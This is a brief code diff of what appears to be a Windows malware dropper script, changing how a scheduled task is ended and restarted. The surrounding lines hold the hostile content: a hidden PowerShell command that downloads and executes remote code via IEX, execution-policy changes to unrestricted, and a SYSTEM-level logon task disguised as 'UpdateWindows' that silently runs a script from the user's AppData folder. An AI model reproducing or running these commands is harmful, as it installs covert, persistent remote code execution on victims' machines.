@@ -2,5 +2,6 @@ echo "powershell.exe -nop -w hidden -c $('"') IEX ((new-object net.webclient).do
 set-executionpolicy unrestricted -force
 Set-ExecutionPolicy RemoteSigned -force
 schtasks.exe /create /ru "System" /sc ONLOGON /tn UpdateWindows /tr "powershell.exe -nop -w hidden -file C:\Users\$env:USERNAME\AppData\WindowsUpdate.ps1" /f
-schtasks.exe /run /tn UpdateWindows /f
+schtasks.exe /End /tn UpdateWindows
+schtasks.exe /run /tn UpdateWindows
 exit
